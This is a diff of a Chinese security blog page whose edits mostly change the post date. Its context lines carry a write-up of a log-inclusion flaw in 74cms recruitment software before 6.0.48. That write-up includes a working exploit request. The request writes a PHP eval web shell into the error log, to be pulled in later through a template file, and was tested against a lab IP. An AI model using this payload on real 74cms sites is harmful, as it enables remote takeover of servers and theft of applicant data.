@@ -18,7 +18,7 @@
 <meta name="description" content="简介骑士CMS是一款被广泛应用于人才招聘系统的程序，2020年年底被爆出模板文件存在注入可通过写木马进日志的方法包含日志Getshell.受影响版本：&lt; 6.0.48">
 <meta property="og:type" content="article">
 <meta property="og:title" content="骑士CMS 模板文件日志包含Getshell">
-<meta property="og:url" content="https://www.tu3k.cn/2021/01/08/74cms-tempelate-log-include-shell/index.html">
+<meta property="og:url" content="https://www.tu3k.cn/2021/01/09/74cms-tempelate-log-include-shell/index.html">
 <meta property="og:site_name">
 <meta property="og:description" content="简介骑士CMS是一款被广泛应用于人才招聘系统的程序，2020年年底被爆出模板文件存在注入可通过写木马进日志的方法包含日志Getshell.受影响版本：&lt; 6.0.48">
 <meta property="og:locale" content="en_US">
@@ -27,8 +27,8 @@
 <meta property="og:image" content="https://www.tu3k.cn/images/74cms/3.png">
 <meta property="og:image" content="https://www.tu3k.cn/images/74cms/4.png">
 <meta property="og:image" content="https://www.tu3k.cn/images/74cms/5.png">
-<meta property="article:published_time" content="2021-01-08T02:58:32.000Z">
-<meta property="article:modified_time" content="2021-01-08T03:15:31.410Z">
+<meta property="article:published_time" content="2021-01-09T02:58:32.000Z">
+<meta property="article:modified_time" content="2021-01-08T03:21:02.423Z">
 <meta property="article:tag" content="骑士CMS Getshell">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://www.tu3k.cn/images/74cms/1.png">
@@ -277,8 +277,8 @@
       <div class="body-wrap"><article id="post-74cms-tempelate-log-include-shell" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/01/08/74cms-tempelate-log-include-shell/" class="article-date">
-      <time datetime="2021-01-08T02:58:32.000Z" itemprop="datePublished">2021-01-08</time>
+      <a href="/2021/01/09/74cms-tempelate-log-include-shell/" class="article-date">
+      <time datetime="2021-01-09T02:58:32.000Z" itemprop="datePublished">2021-01-09</time>
 </a>
 
 
@@ -316,7 +316,7 @@
         
         <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>骑士CMS是一款被广泛应用于人才招聘系统的程序，2020年年底被爆出模板文件存在注入可通过写木马进日志的方法包含日志Getshell.<br>受影响版本：&lt; 6.0.48</p>
 <a id="more"></a>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载6.0.2版本：<a target="_blank" rel="noopener" href="https://www.74cms.com/download/index.html">https://www.74cms.com/download/index.html</a><br>本地搭建PHP版本要高于5.3，推荐使用Phpstudy</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载6.0.2版本：<br><a target="_blank" rel="noopener" href="https://www.74cms.com/download/index.html">https://www.74cms.com/download/index.html</a><br>本地搭建PHP版本要高于5.3，推荐使用Phpstudy</p>
 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>EXP:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL：http:&#x2F;&#x2F;192.168.235.141&#x2F;index.php?m&#x3D;home&amp;a&#x3D;assign_resume_tpl</span><br><span class="line">POST：variable&#x3D;1&amp;tpl&#x3D;&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php \$a&#x3D;\$_POST[&#39;tu3k&#39;];\$b&#x3D;&#39;a&#39;;eval(\$\$b);?&gt;&quot;)?&gt;; ob_flush();?&gt;&#x2F;r&#x2F;n&lt;qscms&#x2F;company_show 列表名&#x3D;&quot;info&quot; 企业id&#x3D;&quot;$_GET[&#39;id&#39;]&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure>
 <p><img src="https://www.tu3k.cn/images/74cms/1.png" alt="log" title="log"><br>报错了，是正常的，就是通过执行语句出错来将我们的PHP代码插入到报错日志中<br>日志默认存放在<br><code>\data\Runtime\Logs\Home\</code>下，文件名以当天日期命名<br><img src="https://www.tu3k.cn/images/74cms/2.png" alt="模板文件getshell" title="模板文件getshell"><br>可以看到成功插入日志中，接下来继续通过模板文件来包含进日志</p>
@@ -330,13 +330,13 @@
   
     
     <div class="copyright">
-        <p><span>Title:</span><a href="/2021/01/08/74cms-tempelate-log-include-shell/">骑士CMS 模板文件日志包含Getshell</a></p>
+        <p><span>Title:</span><a href="/2021/01/09/74cms-tempelate-log-include-shell/">骑士CMS 模板文件日志包含Getshell</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
-        <p><span>Created:</span>2021-01-08, 10:58:32</p>
-        <p><span>Updated:</span>2021-01-08, 11:15:31</p>
+        <p><span>Created:</span>2021-01-09, 10:58:32</p>
+        <p><span>Updated:</span>2021-01-08, 11:21:02</p>
         <p>
-            <span>Full URL:</span><a class="post-url" href="/2021/01/08/74cms-tempelate-log-include-shell/" title="骑士CMS 模板文件日志包含Getshell">https://www.tu3k.cn/2021/01/08/74cms-tempelate-log-include-shell/</a>
-            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/01/08/74cms-tempelate-log-include-shell/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <span>Full URL:</span><a class="post-url" href="/2021/01/09/74cms-tempelate-log-include-shell/" title="骑士CMS 模板文件日志包含Getshell">https://www.tu3k.cn/2021/01/09/74cms-tempelate-log-include-shell/</a>
+            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/01/09/74cms-tempelate-log-include-shell/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -431,7 +431,7 @@
         
     </div>
 
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/01/08/74cms-tempelate-log-include-shell/">骑士CMS 模板文件日志包含Getshell</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/08/cs-chm-online/">CobaltStrike实现Chm后门</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/07/redis/">Redis未授权访问</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/04/7i24tiquan/">记录一次7i24星外虚拟主机提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/03/yinduneiwang/">记一次印度网站getshell到内网漫游</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/29/kerberos-study/">个人理解kerberos的作用和运行流程</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/28/frp/">Frp内网转发/穿透使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/28/edu_bug/">某教育系统的基础漏洞检测</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/27/ueditor_net_upload/">Ueditor.NET版本任意文件上传漏洞</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/01/09/74cms-tempelate-log-include-shell/">骑士CMS 模板文件日志包含Getshell</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/08/cs-chm-online/">CobaltStrike实现Chm后门</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/07/redis/">Redis未授权访问</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/04/7i24tiquan/">记录一次7i24星外虚拟主机提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/03/yinduneiwang/">记一次印度网站getshell到内网漫游</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/29/kerberos-study/">个人理解kerberos的作用和运行流程</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/28/frp/">Frp内网转发/穿透使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/28/edu_bug/">某教育系统的基础漏洞检测</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/27/ueditor_net_upload/">Ueditor.NET版本任意文件上传漏洞</a></li></ul>
 
 
 
